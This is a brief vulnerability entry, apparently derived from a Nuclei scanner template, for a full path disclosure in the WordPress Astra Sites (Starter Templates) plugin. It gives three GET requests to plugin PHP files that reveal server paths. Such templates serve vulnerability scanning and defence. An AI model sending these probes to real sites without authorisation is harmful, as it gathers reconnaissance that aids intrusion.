# Vulnerability: WordPress Astra Sites - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-astra-sites-fpd.yaml`)

## Description
WordPress Starter Templates plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/astra-sites/inc/classes/class-astra-sites.php
GET {{BaseURL}}/wp-content/plugins/astra-sites/inc/classes/class-astra-sites-importer.php
GET {{BaseURL}}/wp-content/plugins/astra-sites/inc/lib/starter-templates-importer/starter-templates-importer.php
```

